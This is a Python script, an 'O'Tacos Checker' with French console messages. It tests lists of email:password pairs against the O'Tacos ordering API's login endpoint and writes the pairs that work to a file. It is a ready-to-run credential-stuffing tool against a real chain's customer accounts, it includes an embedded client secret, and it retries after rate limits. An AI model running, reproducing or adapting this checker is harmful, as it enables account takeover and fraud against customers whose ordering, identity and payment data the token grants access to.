import requests
import time
from colorama import Fore, Style, init
import os

init(autoreset=True)
ORANGE = Fore.YELLOW

def print_title():
    ascii_art = r"""
░█████╗░████████╗░█████╗░░█████╗░░█████╗░░██████╗  
██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝  
██║░░██║░░░██║░░░███████║██║░░╚═╝██║░░██║╚█████╗░  
██║░░██║░░░██║░░░██╔══██║██║░░██╗██║░░██║░╚═══██╗  
╚█████╔╝░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██████╔╝  
░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░
    OTACOS CHECKER BY ESKA
    """
    print(ORANGE + ascii_art)

def clear_console():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def load_valids_set():
    if not os.path.exists("valids.txt"):
        return set()
    with open("valids.txt", "r") as f:
        return set(line.strip() for line in f if line.strip())

def check_account(email, password, valids_set):
    url = "https://api.flyx.cloud/otacos/app/Connect/Token"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://commandes.o-tacos.com",
        "Referer": "https://commandes.o-tacos.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "client_id": "app",
        "client_secret": "1QQ2CRDBOHVTSK5R6ZLFWJ7WQUCCM",
        "scope": "ordering_api app_api identity_api payment_api offline_access openid",
        "language": "fr-FR"
    }

    combo = f"{email}:{password}"

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        resp_json = response.json()

        if response.status_code == 200 and "access_token" in resp_json:
            if combo not in valids_set:
                print(f"{Fore.GREEN}[+] Compte VALIDE : {combo}")
                with open("valids.txt", "a") as f:
                    f.write(combo + "\n")
                valids_set.add(combo)
            else:
                print(f"{Fore.GREEN}[+] Compte VALIDE déjà enregistré : {combo}")
            return True

        elif response.status_code == 422:
            if resp_json.get("Errors"):
                for error in resp_json["Errors"]:
                    if error.get("key") == "LoginError":
                        for e in error.get("errors", []):
                            if "invalid_grant" in e.get("message", ""):
                                print(f"{Fore.RED}[-] Compte INVALIDE : {combo}")
                                return False
            print(f"{Fore.YELLOW}[?] Erreur 422 inattendue pour {combo} : {resp_json}")
            return False

        elif response.status_code == 400:
            print(f"{Fore.RED}[-] Compte INVALIDE : {combo}")
            return False

        elif response.status_code == 429:
            print(f"{Fore.MAGENTA}[!] Trop de requêtes, attente 10 secondes...")
            time.sleep(10)
            return False

        else:
            print(f"{Fore.YELLOW}[?] Réponse inattendue ({response.status_code}) pour {combo}")
            print(resp_json)
            return False

    except Exception as e:
        print(f"{Fore.RED}[!] Erreur sur {combo} - {str(e)}")
        return False

def lancer_checker():
    fichier = input(f"{ORANGE}[?] Chemin du fichier combos (email:pass) : {Style.RESET_ALL}")
    fichier = fichier.strip('"').strip("'")

    if not os.path.isfile(fichier):
        print(f"{Fore.RED}[!] Fichier introuvable ou chemin invalide.")
        return

    try:
        with open(fichier, 'r') as f:
            combos = f.read().splitlines()
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur lecture fichier : {str(e)}")
        return

    valids_set = load_valids_set()

    for combo in combos:
        try:
            email, password = combo.strip().split(":")
            check_account(email, password, valids_set)
            time.sleep(0)
        except Exception as e:
            print(f"{Fore.RED}[!] Erreur avec la ligne : {combo} - {str(e)}")

def menu():
    print_title()
    while True:
        print(f"\n{ORANGE}=== O'Tacos Checker ==={Style.RESET_ALL}")
        print("[1] Lancer le checker")
        print("[2] Quitter")
        choix = input(f"{ORANGE}>>> {Style.RESET_ALL}")
        if choix == "1":
            lancer_checker()
        elif choix == "2":
            print(f"{ORANGE}Au revoir !")
            break
        else:
            print(f"{Fore.RED}[!] Choix invalide.")
clear_console()
menu()
